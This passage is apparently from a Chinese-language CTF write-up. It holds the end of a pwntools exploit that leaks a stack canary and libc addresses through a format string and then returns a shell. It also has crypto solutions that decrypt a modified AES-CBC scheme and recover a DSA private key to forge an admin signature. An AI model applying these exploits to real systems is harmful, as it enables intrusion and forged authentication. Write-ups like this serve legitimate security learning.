        sleep(0.1)
        r.sendline('2')
        sleep(0.1)
        r.sendline('%c'*401 + '@%p'*10 + 'AAA')
        sleep(0.1)
        tmp = r.recvuntil('AAA')
        tmp = tmp.split('@')
        canary = int(tmp[-10], 16)
        stack = int(tmp[-4], 16)
        libc.address = int(tmp[-6], 16) - libc.sym['__libc_start_main'] -0xf0
        code.address = int(tmp[-7], 16) - 0xd70
        info('%016x libc.address', libc.address)
        info('%016x code.address', code.address)
        info('%016x canary', canary)
        info('%016x stack', stack)
        addr = stack - 0xd58
        ff = flat(libc.address+0xf1147, 1, 2, 3, 4, 0, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, code.address+0x202800, 18, 19, 20, 21, 22, 23, 24, 25, 26, addr-0x40, 28, 29)
        sleep(0.1)
        r.sendline('1')
        sleep(0.1)
        r.sendline(ff)
        sleep(0.1)
        r.sendline('0')
        r.interactive()
# Crypto
## Easy crypto
题目直接给了key，需要自己写解密函数。看一下加密函数，就是AES加密中间，对每个block都异或了iv，最后还把iv作为密文头部返回。只需要写一个逆操作就可以了。  
解密代码如下：
    #!usr/bin/python 
    #_*_ coding=UTF-8 _*_
    from Crypto.Cipher import AES
    from binascii import b2a_hex, a2b_hex
    from Crypto import Random
    import sys
    class aesdemo:
        #aes = AES.new(key,mode)
        def __init__(self,key):
            self.key = key
            #self.BS=BS
        def pad(self,msg):
            #BS = AES.block_size 
            # aes数据分组长度为128 bit
            byte = 16 - len(msg) % 16
            return msg + chr(byte) * byte
        def unpad(self,msg):
            if not msg:
                return ''
            return msg[:-ord(msg[-1])]      
        def xor(self,a, b):
                #assert len(a) == len(b)
                return ''.join([chr(ord(ai)^ord(bi)) for ai, bi in zip(a,b)])
        def split_by(self,data,step):
                return [data[i : i+step] for i in xrange(0, len(data), step)]
        def encrypt(self, plaintext):
            # 生成随机初始向量IV
            iv = Random.new().read(16)
            aes = AES.new(self.key,AES.MODE_CBC,iv)
            prev_pt = iv
            prev_ct = iv
            ct=""
            msg=self.pad(plaintext)
            for block in self.split_by(msg, 16):
                ct_block = self.xor(block, prev_pt)
                ct_block = aes.encrypt(ct_block)
                ct_block = self.xor(ct_block, prev_ct)
                ct += ct_block
            return b2a_hex(iv + ct)
        def decrypt(self,cipher):
            c=a2b_hex(cipher)
            iv=c[:16]
            cipher=c[16:]
            aes = AES.new(self.key,AES.MODE_CBC,iv)
            prev_pt = iv
            prev_ct = iv
            pl=""
            msg=cipher
            for block in self.split_by(msg, 16):
                p_block = self.xor(block, prev_pt)
                p_block = aes.decrypt(p_block)
                p_block = self.xor(p_block, prev_ct)
                pl += p_block
            return self.unpad(pl)
    # 测试模块
    if __name__ == '__main__':
        cipher="524160f3d098ad937e252494f827f8cf26cc549e432ff4b11ccbe2d8bfa76e5c6606aad5ba17488f11189d41bca45baa"
        BS = AES.block_size # aes数据分组长度为128 bit
        key="asdfghjkl1234567890qwertyuiopzxc"
        demo = aesdemo(key)
        e = demo.encrypt("a"*16)
        p = demo.decrypt(cipher)
        print p
## 伪造签名
首先从pub中提取DSA公钥，得到p,q,g。审计源代码，签名后计算出两个值s和r。其中私钥pri是未知的，s是由pri以及r运算生成的。让服务器对一个已知字符串进行签名，获得r和s，可以通过模p上的运算求出pri。得到私钥后即可伪造admin的签名，让服务器验证，获得flag。
    #!use/bin/python
    from hashlib import sha512
    p=0x00e58c4b03419856a2bdf8e027d4634879d4f1d5cf62958efc7b4116d9850629577a2f3d29094af814a4d37843ae5ec0152641f93d48b8fa811c175b9aba4bac2c67312fd82caee22babdaf8d76bf6e9b5b1876bdae8b4ead8f85eecd5ecf7cc305cf03f38888027cf9db4bf89a50c04627772e7c957e29a81767cafb9be522a992d4dd1a755de77f8eed08f74e066bb456a4d19564d3680c21cce9846b3d9b703c25b53074c27c1718a82b00a3f6445001b89ba376d1387d499d1e7bfff90a97b1cf228e0abc0d683b80e7521249c88ec3bc85f311b70baece10b5753b2a29f159aafb75969eeee496b5e30224aa3fd289d1f43b6954f34b871637247f155ffc1
    q= 0x00e02de0483211755e1479ab841fb11b71d0be7eecf58b6d7acbc001535714f44f
    g=0x008162303e2cf766a23f4ca9209648f0b1b6034b22a577b2ed3982a40e1d4d821c8bd3fcc97c3407e18838a414639627e349a5e9dce42bbe9f653bab05652243803f8e5478aaf03e850236ca32d13814709aaa3433d3180503ea189bd4cdcad44b678b32d7e6e32903219d74fb457f24c28e7c4a53615a1b7cd834a52fa5ca4218190fd8c4b5c87647351a5d7ee960744461ec95c1c72b4327f7f83aea24922c1968d329ab91f287b601d09e36e366faae374f0a43cb445ba763eaeed6f75a4e694f3daec20d4d8148106e4bb79ed2d65fdf60d4310afaf19c9f84047cc815f2c713f99b23e4988ae70403953f8e3560a0f1f1ced572d03be8b99961955333d229
    def s2h(s):
        return ''.join([hex(ord(c)).replace('0x', '') for c in s])
    def h2i(s):
            #print(s)
            #print(type(s))
        return int(str(s),16)
    def nonce(msg, num):
        n = 0
        msg=h2i(msg)
        num=h2i(num)
        for i in str(msg):
            i=int(i)**int(i)
            d=int(str(int(i)*3141592653)[-6:])
            n += num % d
        n = (num-n) % d
        return n
    def egcd(a, b):
        if a == 0:
            return (b, 0, 1)
        else:
            g, y, x = egcd(b % a, a)
            return (g, x - (b // a) * y, y)
    def modinv(a, m):
        g, x, y = egcd(a, m)
        if g != 1:
            raise Exception('modular inverse does not exist')
        else:
            return x % m
    def sign(data):
        data = s2h(data)
        k = nonce(data,q)
        kinv = modinv(k, q)
        r = pow(g, k, p) % q
        h = sha512(data).hexdigest()
        h = int(h,16)
        s = kinv * (h + r * priv) % q
        return (r, s)
    def veryfy(data):
        h = sha512(data).hexdigest()
        h = int(h,16)
    #get from server when name =admins
    r1=90070573032872447121024029430718629638260432295511124276056848475122201240021L
    s1=68073756336683619265031749533878249052846049048347537247828287528295874908598
    data=s2h("admins")
    k=nonce(data,q)
    h = sha512(data).hexdigest()
    h = int(h,16)
    priv=((((s1*k)%q-h)%q) *modinv(r1,q))%q
    print priv
    (r,s)=sign("admins")
    assert(r1==r)
    assert(s1==s)
    print sign("admin")
## Mixmix
这题总共有三关,先用rsa加密flag，随后随机生成第二组密钥，用于加密解密指数d的一半  
首先可以用中间打印的随机数结果进行伪随机数预测，从而得到第二次加密的密钥
    #python3
    import os
    #import primefac
    import random
    def generateBOX():
        ss=[]